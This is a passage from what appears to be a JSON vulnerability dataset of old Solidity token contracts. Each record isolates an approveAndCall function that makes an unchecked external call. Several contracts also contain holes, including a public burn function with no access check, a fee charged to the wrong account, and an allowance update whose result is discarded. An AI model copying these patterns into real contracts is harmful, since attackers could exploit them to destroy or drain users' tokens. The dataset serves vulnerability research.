{\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function TripleCoin(\n ) {\n balances[msg.sender] = 23000000000000000000000000;\n totalSupply = 23000000000000000000000000;\n name = \"TripleCoin\";\n decimals = 18;\n symbol = \"TIC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d3"
  },
  "filename": "32952.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n uint8 public decimals;\n mapping(address=>bool) internal withoutFee;\n uint256 internal maxFee;\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[msg.sender].add(fee) >= _value && _value > 0) {\n doTransfer(msg.sender,_to,_value,fee);\n return true;\n } else { return false; }\n }\n function getFee(uint256 _value) private returns (uint256){\n uint256 onePercentOfValue=_value.onePercent();\n uint256 fee=uint256(maxFee).power(decimals);\n if (onePercentOfValue>= fee) {\n return fee;\n }\n if (onePercentOfValue < fee) {\n return onePercentOfValue;\n }\n }\n function doTransfer(address _from,address _to,uint256 _value,uint256 fee) internal {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n if(!withoutFee[_from]){\n doBurn(_from,fee);\n }\n }\n function doBurn(address _from,uint256 _value) private returns (bool success){\n require(balanceOf(_from) >= _value);\n balances[_from] =balances[_from].sub(_value);\n _totalSupply =_totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function burn(address _from,uint256 _value) public returns (bool success) {\n return doBurn(_from,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n uint256 valueWithFee=_value;\n if(!withoutFee[_from]){\n valueWithFee=valueWithFee.add(fee);\n }\n if (balances[_from] >= valueWithFee && allowed[_from][msg.sender] >= valueWithFee && _value > 0 ) {\n doTransfer(_from,_to,_value,fee);\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(valueWithFee);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n}\ncontract FinalTestToken2 is StandardToken {\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n address private _owner;\n string public feeInfo = \"Each operation costs 1% of the transaction amount, but not more than 250 tokens.\";\n function FinalTestToken2() {\n _totalSupply = 800000000000000000000000000;\n _owner=msg.sender;\n balances[msg.sender] =_totalSupply;\n allocate(0x98592d09bA9B739BF9D563a601CB3F6c3A238475,20);\n allocate(0xf088394D9AEec53096A18Fb192C98FD90495416C,20);\n allocate(0x353c65713fDf8169f14bE74012a59eF9BAB00e9b,5);\n allocate(0x52B8fA840468e2dd978936B54d0DC83392f4B4aC,35);\n allocate(0x7DfE12664C21c00B6A3d1cd09444fC2CC9e7f192,20);\n maxFee=100;\n name = \"Final Test Token\";\n decimals = 18;\n symbol = \"EQL\";\n }\n function allocate(address _address,uint256 percent) private{\n uint256 bal=_totalSupply.onePercent().mul(percent);\n withoutFee[_address]=true;\n doTransfer(msg.sender,_address,bal,0);\n }\n function setWithoutFee(address _address,bool _withoutFee) public {\n require(_owner==msg.sender);\n withoutFee[_address]=_withoutFee;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d4"
  },
  "filename": "32955.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n uint8 public decimals;\n mapping(address=>bool) internal withoutFee;\n uint256 internal maxFee;\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[msg.sender].add(fee) >= _value && _value > 0) {\n doTransfer(msg.sender,_to,_value,fee);\n return true;\n } else { return false; }\n }\n function getFee(uint256 _value) private returns (uint256){\n uint256 onePercentOfValue=_value.onePercent();\n uint256 fee=uint256(maxFee).power(decimals);\n if (_value.add(onePercentOfValue) >= fee) {\n return fee;\n } if (_value.add(onePercentOfValue) < fee) {\n return onePercentOfValue;\n }\n }\n function doTransfer(address _from,address _to,uint256 _value,uint256 fee) internal {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n if(!withoutFee[_from]){\n doBurn(_from,fee);\n }\n }\n function doBurn(address _from,uint256 _value) private returns (bool success){\n require(balanceOf(_from) >= _value);\n balances[_from] =balances[_from].sub(_value);\n _totalSupply =_totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function burn(address _from,uint256 _value) public returns (bool success) {\n return doBurn(_from,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n uint256 valueWithFee=_value;\n if(!withoutFee[_from]){\n valueWithFee=valueWithFee.add(fee);\n }\n if (balances[_from] >= valueWithFee && allowed[_from][msg.sender] >= valueWithFee && _value > 0 ) {\n doTransfer(_from,_to,_value,fee);\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(valueWithFee);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n}\ncontract FinalTestToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n address private _owner;\n string public feeInfo = \"Each operation costs 1% of the transaction amount, but not more than 250 tokens.\";\n function FinalTestToken() {\n _totalSupply = 800000000000000000000000000;\n _owner=msg.sender;\n balances[msg.sender] =_totalSupply;\n allocate(0x98592d09bA9B739BF9D563a601CB3F6c3A238475,20);\n allocate(0xf088394D9AEec53096A18Fb192C98FD90495416C,20);\n allocate(0x353c65713fDf8169f14bE74012a59eF9BAB00e9b,5);\n allocate(0x52B8fA840468e2dd978936B54d0DC83392f4B4aC,35);\n allocate(0x7DfE12664C21c00B6A3d1cd09444fC2CC9e7f192,20);\n maxFee=250;\n name = \"Final Test Token\";\n decimals = 18;\n symbol = \"FTT\";\n }\n function allocate(address _address,uint256 percent) private{\n uint256 bal=_totalSupply.onePercent().mul(percent);\n withoutFee[_address]=true;\n doTransfer(msg.sender,_address,bal,0);\n }\n function setWithoutFee(address _address,bool _withoutFee) public {\n require(_owner==msg.sender);\n withoutFee[_address]=_withoutFee;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d5"
  },
  "filename": "32969.sol",
  "content": "pragma solidity ^0.4.17;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DNERO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function DNERO(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"dNero\";\n decimals = 18;\n symbol = \"DNR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d6"
  },
  "filename": "32972.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n uint8 public decimals;\n mapping(address=>bool) internal withoutFee;\n uint256 internal maxFee;\n function transfer(address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[msg.sender].add(fee) >= _value && _value > 0) {\n doTransfer(msg.sender,_to,_value,fee);\n return true;\n } else { return false; }\n }\n function getFee(uint256 _value) private returns (uint256){\n uint256 onePercentOfValue=_value.onePercent();\n uint256 fee=uint256(maxFee).power(decimals);\n if (_value.add(onePercentOfValue) >= fee) {\n return fee;\n } if (_value.add(onePercentOfValue) < fee) {\n return onePercentOfValue;\n }\n }\n function doTransfer(address _from,address _to,uint256 _value,uint256 fee) internal {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n if(!withoutFee[_from]){\n doBurn(msg.sender,fee);\n }\n }\n function doBurn(address _from,uint256 _value) private returns (bool success){\n require(balanceOf(_from) >= _value);\n balances[_from] =balances[_from].sub(_value);\n _totalSupply =_totalSupply.sub(_value);\n Burn(_from, _value);\n return true;\n }\n function burn(address _from,uint256 _value) public returns (bool success) {\n return doBurn(_from,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 fee=getFee(_value);\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0 &&\n (balances[msg.sender]>fee || withoutFee[msg.sender])) {\n doTransfer(_from,_to,_value,fee);\n uint256 decraseAllowed=_value;\n if(!withoutFee[msg.sender]){\n decraseAllowed.add(fee);\n }\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(decraseAllowed);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n}\ncontract TestToken12 is StandardToken {\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n address private _owner;\n string public feeInfo = \"Each operation costs 1% of the transaction amount, but not more than 250 tokens.\";\n function TestToken12() {\n _totalSupply = 800000000000000000000000000;\n _owner=msg.sender;\n balances[msg.sender] =_totalSupply;\n allocate(0x98592d09bA9B739BF9D563a601CB3F6c3A238475,55);\n allocate(0x52B8fA840468e2dd978936B54d0DC83392f4B4aC,20);\n allocate(0x7DfE12664C21c00B6A3d1cd09444fC2CC9e7f192,20);\n allocate(0x353c65713fDf8169f14bE74012a59eF9BAB00e9b,5);\n maxFee=250;\n name = \"Test Token 12\";\n decimals = 18;\n symbol = \"TT12\";\n }\n function allocate(address _address,uint256 percent) private{\n uint256 bal=_totalSupply.onePercent().mul(percent);\n withoutFee[_address]=true;\n doTransfer(msg.sender,_address,bal,0);\n }\n function addToWithoutFee(address _address) public {\n require(msg.sender==_owner);\n withoutFee[_address]=true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d7"
  },
  "filename": "32973.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SAILER is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SAILER(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"CRYPTO SAILERS\";\n decimals = 18;\n symbol = \"SAIL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d8"
  },
  "filename": "32975.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract UnixCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function UnixCoin(\n ) {\n balances[msg.sender] = 19000000000000000000000000;\n totalSupply = 19000000000000000000000000;\n name = \"UnixCoin\";\n decimals = 18;\n symbol = \"UNC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14d9"
  },
  "filename": "32980.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PROMOSAILER is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PROMOSAILER(\n ) {\n balances[msg.sender] = 21000000000;\n totalSupply = 21000000000;\n name = \"PROMO SAILER\";\n decimals = 0;\n symbol = \"PROMO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14da"
  },
  "filename": "32983.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SAILER is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SAILER(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"SAILER\";\n decimals = 18;\n symbol = \"SAIL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14db"
  },
  "filename": "32985.sol",
